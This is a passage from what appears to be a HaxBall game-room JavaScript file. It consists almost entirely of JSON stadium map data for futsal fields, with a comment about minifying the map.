9086327183,"bCoef":0.1,"trait":"line"},{"x":160.41249829706,"y":-159.39453936245,"bCoef":0.1,"trait":"line"},{"x":160.41249829706,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":80.162431463036,"y":-159.39453936245,"bCoef":0.1,"trait":"line"},{"x":80.162431463036,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":-254.88159756902,"y":-171,"bCoef":0.1,"trait":"line"},{"x":-254.88159756902,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":-371.91294503531,"y":-87.759267023458,"bCoef":0.1,"trait":"line"},{"x":-384.61920561736,"y":-87.759267023458,"bCoef":0.1,"trait":"line"},{"x":371.73767429333,"y":-87.759267023458,"bCoef":0.1,"trait":"line"},{"x":384.44393487538,"y":-87.759267023458,"bCoef":0.1,"trait":"line"},{"x":-371.91294503531,"y":86.718723029916,"bCoef":0.1,"trait":"line"},{"x":-384.61920561736,"y":86.718723029916,"bCoef":0.1,"trait":"line"},{"x":371.73767429333,"y":86.718723029916,"bCoef":0.1,"trait":"line"},{"x":384.44393487538,"y":86.718723029916,"bCoef":0.1,"trait":"line"},{"x":-254.88159756902,"y":171,"bCoef":0.1,"trait":"line"},{"x":-254.88159756902,"y":181.05031927829,"bCoef":0.1,"trait":"line"},{"x":254.70632682704,"y":-171,"bCoef":0.1,"trait":"line"},{"x":254.70632682704,"y":-182.09086327183,"bCoef":0.1,"trait":"line"},{"x":254.70632682704,"y":171,"bCoef":0.1,"trait":"line"},{"x":254.70632682704,"y":181.05031927829,"bCoef":0.1,"trait":"line"},{"x":377,"y":-65,"trait":"line","cMask":["ball"],"bCoef":1},{"x":377,"y":-171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-377,"y":-65,"trait":"line","cMask":["ball"],"bCoef":1},{"x":-377,"y":-171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":-377,"y":65,"trait":"line","cMask":["ball"],"bCoef":1},{"x":-377,"y":171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":377,"y":65,"trait":"line","cMask":["ball"],"bCoef":1},{"x":377,"y":171,"trait":"ballArea","cMask":["ball"],"bCoef":1},{"x":371,"y":-65,"trait":"ballArea","cMask":["ball"],"bCoef":0},{"x":371,"y":-171,"trait":"ballArea","cMask":["ball"],"bCoef":0},{"x":371,"y":65,"trait":"ballArea","cMask":["ball"],"bCoef":0},{"x":371,"y":171,"trait":"ballArea","cMask":["ball"],"bCoef":0},{"x":-371,"y":65,"trait":"ballArea","cMask":["ball"],"bCoef":0},{"x":-371,"y":171,"trait":"ballArea","cMask":["ball"],"bCoef":0},{"x":-371,"y":-65,"trait":"ballArea","cMask":["ball"],"bCoef":0},{"x":-371,"y":-171,"trait":"ballArea","cMask":["ball"],"bCoef":0}],"segments":[{"v0":0,"v1":1,"trait":"ballArea"},{"v0":2,"v1":3,"trait":"ballArea"},{"v0":4,"v1":5,"trait":"ballArea"},{"v0":6,"v1":7,"trait":"ballArea"},{"v0":8,"v1":9,"trait":"kickOffBarrier","curve":180,"cGroup":["blueKO"]},{"v0":8,"v1":9,"trait":"kickOffBarrier","curve":-180,"cGroup":["redKO"]},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":1,"v1":0,"cMask":["ball"],"x":-368},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":5,"v1":4,"cMask":["ball"],"x":368},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":2,"v1":3,"cMask":["ball"],"x":-368},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":6,"v1":7,"cMask":["ball"],"x":368},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":0,"v1":10,"y":171},{"vis":true,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":3,"v1":11,"y":-171},{"curve":0,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":12,"v1":13},{"curve":-180,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":9,"v1":8},{"curve":180,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":15,"v1":14},{"curve":0,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":2,"v1":1},{"curve":0,"vis":true,"color":"FFFFFF","bCoef":0,"trait":"line","v0":6,"v1":5},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":16,"v1":17,"cMask":["ball"],"x":330},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":18,"v1":19,"cMask":["ball"],"x":-330},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":20,"v1":21,"cMask":["ball"],"x":-330},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":22,"v1":23,"cMask":["ball"],"x":330},{"v0":24,"v1":25,"trait":"kickOffBarrier"},{"v0":26,"v1":27,"trait":"kickOffBarrier"},{"v0":28,"v1":29,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,-80],"y":-80},{"v0":29,"v1":30,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","x":-590},{"v0":30,"v1":31,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,80],"y":80},{"v0":32,"v1":33,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,-80],"y":-80},{"v0":33,"v1":34,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","x":-590},{"v0":34,"v1":35,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,80],"y":80},{"v0":36,"v1":37,"curve":94.0263701017,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":39,"v1":38,"curve":86.632306418889,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":40,"v1":41,"curve":-94.026370101699,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":37,"v1":41,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":43,"v1":42,"curve":-86.632306418888,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":45,"v1":44,"curve":86.632306418884,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":47,"v1":46,"curve":-86.632306418899,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":48,"v1":49,"curve":-94.026370101699,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":50,"v1":51,"curve":94.026370101699,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":52,"v1":53,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":390},{"v0":55,"v1":54,"curve":-180.00692920292,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":54,"v1":55,"curve":-180.00218240614,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":57,"v1":56,"curve":-179.64823645332,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":56,"v1":57,"curve":-180.35758668147,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":59,"v1":58,"curve":-180.02357323962,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":58,"v1":59,"curve":-180.00924102399,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":61,"v1":60,"curve":-180.06885755885,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":60,"v1":61,"curve":-180.02948353257,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":63,"v1":62,"curve":-179.99869069543,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":62,"v1":63,"curve":-179.99939258776,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":65,"v1":64,"curve":-180.08826047163,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":64,"v1":65,"curve":-179.91186753664,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":67,"v1":66,"curve":-179.99528711105,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":66,"v1":67,"curve":-179.99743836358,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":69,"v1":68,"curve":-179.98626041101,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":68,"v1":69,"curve":-179.99175181595,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":71,"v1":70,"curve":-180.04715562398,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":70,"v1":71,"curve":-179.95294709391,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":73,"v1":72,"curve":-179.95715750564,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":72,"v1":73,"curve":-179.89943871875,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":75,"v1":74,"curve":-179.94773754738,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":74,"v1":75,"curve":-179.98221351296,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":77,"v1":76,"curve":-180.4151727218,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":76,"v1":77,"curve":-179.58764458796,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":79,"v1":78,"curve":-180.00086646359,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":78,"v1":79,"curve":-180.01965986376,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":81,"v1":80,"curve":-180.03532601389,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":80,"v1":81,"curve":-179.99380079,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":83,"v1":82,"curve":-180.0044468452,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":82,"v1":83,"curve":-180.01386779847,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":85,"v1":84,"curve":-180.05158287563,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":84,"v1":85,"curve":-180.01212223878,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":86,"v1":87,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240},{"v0":88,"v1":89,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-120},{"v0":90,"v1":91,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":240},{"v0":92,"v1":93,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":120},{"v0":94,"v1":95,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-381},{"v0":96,"v1":97,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":123},{"v0":98,"v1":99,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":123},{"v0":100,"v1":101,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":-123},{"v0":102,"v1":103,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":-123},{"v0":104,"v1":105,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-381},{"v0":106,"v1":107,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":381},{"v0":108,"v1":109,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":381},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":110,"v1":111,"cMask":["ball"],"x":330},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":112,"v1":113,"cMask":["ball"],"x":-330},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":114,"v1":115,"cMask":["ball"],"x":-330},{"vis":false,"color":"FFFFFF","bCoef":1,"trait":"ballArea","v0":116,"v1":117,"cMask":["ball"],"x":330},{"vis":false,"color":"FFFFFF","bCoef":0,"trait":"ballArea","v0":118,"v1":119,"cMask":["ball"],"x":371},{"vis":false,"color":"FFFFFF","bCoef":0,"trait":"ballArea","v0":120,"v1":121,"cMask":["ball"],"x":371},{"vis":false,"color":"FFFFFF","bCoef":0,"trait":"ballArea","v0":122,"v1":123,"cMask":["ball"],"x":-371},{"vis":false,"color":"FFFFFF","bCoef":0,"trait":"ballArea","v0":124,"v1":125,"cMask":["ball"],"x":-371}],"goals":[{"p0":[-374.25,-62.053454903872],"p1":[-374.25,64.043361696331],"team":"red"},{"p0":[374.25,62],"p1":[374.25,-62],"team":"blue"}],"discs":[{"radius":3.9405255187564,"pos":[-368.53340356886,64.043361696331],"color":"6666CC","trait":"goalPost","y":80},{"radius":3.9405255187564,"pos":[-368.53340356886,-62.053454903872],"color":"6666CC","trait":"goalPost","y":-80,"x":-560},{"radius":3.9405255187564,"pos":[368.9681846993,-62.144998272018],"color":"6666CC","trait":"goalPost","y":80},{"radius":3.9405255187564,"pos":[368.09926357786,63.94882446641],"color":"6666CC","trait":"goalPost","y":-80,"x":-560},{"radius":3,"invMass":0,"pos":[-368,-171],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[-368,171],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[368,171],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[368,-171],"color":"FFCC00","bCoef":0.1,"trait":"line"}],"planes":[{"normal":[0,1],"dist":-171,"trait":"ballArea"},{"normal":[0,-1],"dist":-171,"trait":"ballArea"},{"normal":[0,1],"dist":-200,"bCoef":0.2,"cMask":["all"]},{"normal":[0,-1],"dist":-200,"bCoef":0.2,"cMask":["all"]},{"normal":[1,0],"dist":-420,"bCoef":0.2,"cMask":["all"]},{"normal":[-1,0],"dist":-420,"bCoef":0.2,"cMask":["all"]}],"traits":{"ballArea":{"vis":false,"bCoef":1,"cMask":["ball"]},"goalPost":{"radius":8,"invMass":0,"bCoef":1},"goalNet":{"vis":true,"bCoef":0.1,"cMask":["all"]},"kickOffBarrier":{"vis":false,"bCoef":0.1,"cGroup":["redKO","blueKO"],"cMask":["red","blue"]},"line":{"vis":true,"bCoef":0,"cMask":[""]},"arco":{"radius":2,"cMask":["n\/d"],"color":"cccccc"}},"playerPhysics":{"acceleration":0.11,"kickingAcceleration":0.083,"kickStrength":5,"bCoef":0},"ballPhysics":{"radius":6.25,"color":"FFCC00","bCoef":0.4,"invMass":1.5,"damping":0.99}}'; // Insert your map for 1v1 and 2v2 here. To get minimum file size, here are the instructions : 1. Download the map 2. Go to https://cssminifier.com 3. Paste the result
	var bigMap = '{"name":"𝐟𝐮𝐭𝐬𝐚𝐥 x3 | Futsal |","width":620,"height":270,"spawnDistance":350,"bg":{"type":"hockey","width":550,"height":240,"kickOffRadius":80,"cornerRadius":0},"vertexes":[{"x":550,"y":240,"trait":"ballArea"},{"x":550,"y":-240,"trait":"ballArea"},{"x":0,"y":270,"trait":"kickOffBarrier"},{"x":0,"y":80,"bCoef":0.15,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":180},{"x":0,"y":-80,"bCoef":0.15,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":180},{"x":0,"y":-270,"trait":"kickOffBarrier"},{"x":-550,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":-590,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":-590,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":-550,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":550,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,-80]},{"x":590,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,-80]},{"x":590,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,80]},{"x":550,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,80]},{"x":-550,"y":80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8","pos":[-700,80]},{"x":-550,"y":240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8"},{"x":-550,"y":-80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8","pos":[-700,-80]},{"x":-550,"y":-240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8"},{"x":-550,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","pos":[700,80]},{"x":550,"y":240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":-240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8"},{"x":550,"y":-80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8","pos":[700,-80]},{"x":550,"y":-240,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":-240,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-550,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0},{"x":550,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0},{"x":0,"y":-240,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":-80,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":80,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":240,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":-80,"bCoef":0.1,"cMask":["red","blue"],"trait":"kickOffBarrier","vis":true,"color":"F8F8F8"},{"x":0,"y":80,"bCoef":0.1,"cMask":["red","blue"],"trait":"kickOffBarrier","vis":true,"color":"F8F8F8"},{"x":0,"y":80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":-180},{"x":0,"y":-80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":-180},{"x":0,"y":80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":0},{"x":0,"y":-80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":0},{"x":-557.5,"y":80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false,"pos":[-700,80]},{"x":-557.5,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false},{"x":-557.5,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0},{"x":-557.5,"y":-80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0,"pos":[-700,-80]},{"x":557.5,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0},{"x":557.5,"y":-80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0,"pos":[700,-80]},{"x":557.5,"y":80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false,"pos":[700,80]},{"x":557.5,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false},{"x":0,"y":-80,"bCoef":0.1,"trait":"line"},{"x":0,"y":80,"bCoef":0.1,"trait":"line"},{"x":-550,"y":-80,"bCoef":0.1,"trait":"line"},{"x":-550,"y":80,"bCoef":0.1,"trait":"line"},{"x":550,"y":-80,"bCoef":0.1,"trait":"line"},{"x":550,"y":80,"bCoef":0.1,"trait":"line"},{"x":-240,"y":256,"bCoef":0.1,"trait":"line"},{"x":-120,"y":256,"bCoef":0.1,"trait":"line"},{"x":-240,"y":-256,"bCoef":0.1,"trait":"line"},{"x":-120,"y":-224,"bCoef":0.1,"trait":"line"},{"x":-120,"y":-256,"bCoef":0.1,"trait":"line"},{"x":240,"y":256,"bCoef":0.1,"trait":"line"},{"x":120,"y":224,"bCoef":0.1,"trait":"line"},{"x":120,"y":256,"bCoef":0.1,"trait":"line"},{"x":240,"y":-224,"bCoef":0.1,"trait":"line"},{"x":240,"y":-256,"bCoef":0.1,"trait":"line"},{"x":120,"y":-224,"bCoef":0.1,"trait":"line"},{"x":120,"y":-256,"bCoef":0.1,"trait":"line"},{"x":-381,"y":240,"bCoef":0.1,"trait":"line"},{"x":-381,"y":256,"bCoef":0.1,"trait":"line"},{"x":-550,"y":200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":-390,"y":70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-550,"y":226,"bCoef":0.1,"trait":"line","curve":-90},{"x":-536,"y":240,"bCoef":0.1,"trait":"line","curve":-90},{"x":-550,"y":-200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":-390,"y":-70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-550,"y":-226,"bCoef":0.1,"trait":"line","curve":90},{"x":-536,"y":-240,"bCoef":0.1,"trait":"line","curve":90},{"x":-556,"y":123,"bCoef":0.1,"trait":"line"},{"x":-575,"y":123,"bCoef":0.1,"trait":"line"},{"x":556,"y":123,"bCoef":0.1,"trait":"line"},{"x":575,"y":123,"bCoef":0.1,"trait":"line"},{"x":-556,"y":-123,"bCoef":0.1,"trait":"line"},{"x":-575,"y":-123,"bCoef":0.1,"trait":"line"},{"x":556,"y":-123,"bCoef":0.1,"trait":"line"},{"x":575,"y":-123,"bCoef":0.1,"trait":"line"},{"x":-381,"y":-240,"bCoef":0.1,"trait":"line"},{"x":-381,"y":-256,"bCoef":0.1,"trait":"line"},{"x":381,"y":240,"bCoef":0.1,"trait":"line"},{"x":381,"y":256,"bCoef":0.1,"trait":"line"},{"x":381,"y":-240,"bCoef":0.1,"trait":"line"},{"x":381,"y":-256,"bCoef":0.1,"trait":"line"},{"x":550,"y":-226,"bCoef":0.1,"trait":"line","curve":-90},{"x":536,"y":-240,"bCoef":0.1,"trait":"line","curve":-90},{"x":550,"y":226,"bCoef":0.1,"trait":"line","curve":90},{"x":536,"y":240,"bCoef":0.1,"trait":"line","curve":90},{"x":550,"y":200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":390,"y":70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":550,"y":-200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":390,"y":-70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":390,"y":70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":390,"y":-70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-375,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":3.5,"bCoef":0.1,"trait":"line","curve":180}],"segments":[{"v0":6,"v1":7,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,-80],"y":-80},{"v0":7,"v1":8,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","x":-590},{"v0":8,"v1":9,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,80],"y":80},{"v0":10,"v1":11,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[700,-80],"y":-80},{"v0":11,"v1":12,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","x":590},{"v0":12,"v1":13,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[700,80],"y":80},{"v0":2,"v1":3,"trait":"kickOffBarrier"},{"v0":3,"v1":4,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.15,"cGroup":["blueKO"],"trait":"kickOffBarrier"},{"v0":3,"v1":4,"curve":-180,"vis":true,"color":"F8F8F8","bCoef":0.15,"cGroup":["redKO"],"trait":"kickOffBarrier"},{"v0":4,"v1":5,"trait":"kickOffBarrier"},{"v0":14,"v1":15,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":-550},{"v0":16,"v1":17,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":-550},{"v0":18,"v1":19,"vis":true,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","y":240},{"v0":20,"v1":21,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":550},{"v0":22,"v1":23,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":550},{"v0":24,"v1":25,"vis":true,"color":"F8F8F8","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":550,"y":-240},{"v0":26,"v1":27,"curve":0,"vis":true,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","y":-240},{"v0":28,"v1":29,"vis":true,"color":"F8F8F8","bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"v0":30,"v1":31,"vis":true,"color":"F8F8F8","bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"v0":38,"v1":39,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-557.5},{"v0":40,"v1":41,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-557.5},{"v0":42,"v1":43,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":557.5},{"v0":44,"v1":45,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":557.5},{"v0":46,"v1":47,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":0},{"v0":48,"v1":49,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-550},{"v0":50,"v1":51,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":550},{"v0":64,"v1":65,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-381},{"v0":66,"v1":67,"curve":-90,"vis":true,"color":"